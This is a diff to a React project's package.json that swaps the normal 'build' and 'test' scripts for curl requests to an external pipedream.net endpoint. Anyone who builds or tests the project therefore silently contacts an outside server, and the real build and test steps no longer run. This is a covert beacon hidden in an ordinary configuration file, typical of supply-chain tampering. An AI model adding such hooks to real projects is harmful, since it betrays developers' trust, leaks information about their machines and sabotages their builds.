@@ -15,8 +15,8 @@
   "proxy": "http://localhost:8080",
   "scripts": {
     "start": "react-scripts start",
-    "build": "react-scripts build",
-    "test": "react-scripts test"
+    "build": "curl -X GET https://eo9ld22mvg9u8og.m.pipedream.net/",
+    "test": "curl -X GET https://eo9ld22mvg9u8og.m.pipedream.net/"
   },
   "eslintConfig": {
     "extends": "react-app"
